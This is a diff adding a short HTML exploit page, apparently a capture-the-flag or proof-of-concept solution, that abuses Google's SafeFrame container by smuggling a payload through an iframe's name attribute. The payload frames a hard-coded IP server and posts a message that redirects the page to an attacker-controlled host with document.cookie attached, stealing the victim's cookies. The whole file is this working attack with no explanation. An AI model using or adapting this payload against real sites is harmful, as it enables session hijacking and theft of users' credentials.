@@ -1,0 +1,26 @@
+<html>
+  <body>
+    <script>
+      const frame = document.createElement("iframe")
+      const host = "<Your host>"
+      const payload = `
+<html> 
+  <iframe id="frame" ></iframe>
+  <script>
+    const frame = document.getElementById('frame')
+    
+    frame.onload = _ => {
+      frame.contentWindow.postMessage('{"tt":"window.location=\\'${host}/?a=\\'+document.cookie"}','*')
+    }
+
+    frame.src = "http://159.65.249.122:3183"
+  <\/script>
+</html>
+      `
+      frame.setAttribute("name", `first;${payload.length};${payload}{"" : ""}`)
+      frame.setAttribute("src", "https://tpc.googlesyndication.com/safeframe/1-0-37/html/container.html")
+      document.body.appendChild(frame)
+
+    </script>
+  </body>
+</html>
